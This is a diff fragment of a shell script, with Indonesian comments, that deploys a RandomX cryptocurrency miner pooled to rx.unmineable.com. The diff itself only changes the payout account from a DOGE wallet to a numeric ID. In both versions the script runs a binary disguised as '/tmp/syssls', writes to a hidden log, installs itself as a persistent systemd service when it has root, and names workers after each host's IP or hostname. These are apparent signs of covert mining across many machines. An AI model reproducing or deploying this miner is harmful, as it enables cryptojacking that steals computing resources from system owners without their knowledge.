@@ -78,7 +78,7 @@ After=network.target
 Type=simple
 Restart=on-failure
 RestartSec=15s
-ExecStart=/tmp/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DP2AiCkcponQaMGzKqzMV49M2mvGqoeNTo.$IP_TO_USE -p x
+ExecStart=/tmp/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE -p x
 
 [Install]
 WantedBy=multi-user.target" > /etc/systemd/system/acil.service
@@ -92,7 +92,7 @@ WantedBy=multi-user.target" > /etc/systemd/system/acil.service
     echo "Worker : VPS-$IP_TO_USE"
 else
     # Jika bukan root, jalankan dengan nohup
-    nohup /tmp/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DP2AiCkcponQaMGzKqzMV49M2mvGqoeNTo.$HOSTNAME_REPLACED -p x > /tmp/.logacil 2>&1 & 
+    nohup /tmp/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED -p x > /tmp/.logacil 2>&1 & 
     echo "Menjalankan miner sebagai user non-root dengan nohup."
     echo "Worker : $HOSTNAME_REPLACED"
 fi
